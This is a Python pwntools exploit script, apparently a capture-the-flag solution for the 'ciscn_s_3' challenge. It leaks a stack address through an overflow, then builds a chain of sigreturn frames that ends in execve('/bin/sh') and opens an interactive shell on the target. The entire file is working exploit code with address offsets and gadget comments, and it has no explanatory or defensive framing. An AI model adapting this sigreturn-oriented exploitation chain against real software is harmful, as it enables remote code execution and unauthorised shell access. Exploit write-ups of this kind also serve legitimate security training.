from pwn import *
from time import *
context.binary = './ciscn_s_3'
context.log_level = 'debug'
context.timeout = None
elf = context.binary



def dbg():
	raw_input()

if args['REMOTE']:
	p = remote('pwn.buuoj.cn', 20154)
	libc = ELF('../x64_libc.so.6')
else:
	libc = context.binary.libc
	p = process('./ciscn_s_3')
	#gdb.attach(p, 'b* 0x4004DA ')
	dbg()



syscall = 0x400517 			#syscall; ret
pop_rdi = 0x4005a3			#pop rdi; ret
pop_rsi = 0x4005a1			#pop rsi,; pop r15; ret

main = 0x4004F1
fake_call = 0x4004E1
data = 0x601020

mov_eax_0 = 0x400425 		#mov eax, 0; pop rbp, ret
rt_sigreturn = 0x4004DA 		#mov eax, 0xf; ret
mov_eax_3b = 0x4004e2		#mov eax, 0x3b; ret

rop_init = 0x40059a
mov_call = 0x400580
		
payload = '\x00' * 0x10
payload += p64(main)
p.send(payload)					#write(1, stack_addr, 0x30)
								#will leak an address on stack
p.recv(32)

stack_addr = u64(p.recv(8)) - 0x118	#rsi
print "stack_addr ==> " + hex(stack_addr)
p.recv(8)


frame1 = SigreturnFrame()
frame1.rax = constants.SYS_write
frame1.rdi = 1
frame1.rsi = stack_addr	+ 0x20			#'a'*8
frame1.rdx = 8
frame1.rsp = stack_addr + 0x150			#frame2_sigreturn
frame1.rip = syscall

frame2 = SigreturnFrame()
frame2.rax = constants.SYS_write
frame2.rdi = 1
frame2.rsi = stack_addr + 0x30			#'b'*8
frame2.rdx = 8
frame2.rsp = stack_addr + (0x150+0x108)	#frame3_sigreturn
frame2.rip = syscall

frame3 = SigreturnFrame()
frame3.rax = constants.SYS_execve
frame3.rdi = stack_addr + 0x40
frame3.rsi = 0			
frame3.rdx = 0
frame3.rsp = stack_addr
frame3.rip = syscall

payload = '\x00'*0x10 					#rop_chain  stack_addr+8
payload += p64(pop_rdi) + 'a'*8			#write(1, 'a'*8, 8)		
payload += p64(pop_rdi) + 'b'*8			#write(1, 'b'*8, 8)	
payload += p64(pop_rdi) + '/bin/sh\x00'	#execve("/bin/sh", 0, 0)


payload += p64(rt_sigreturn)
payload += p64(syscall)					#sigreturn
payload += str(frame1)

payload += p64(rt_sigreturn)
payload += p64(syscall)					#sigreturn
payload += str(frame2)

payload += p64(rt_sigreturn)
payload += p64(syscall)					#sigreturn
payload += str(frame3)

print "length ==> " + hex(len(payload))
p.send(payload)

print "lenth_frame ==> " + hex(len(frame3))
p.interactive()
p.close()		





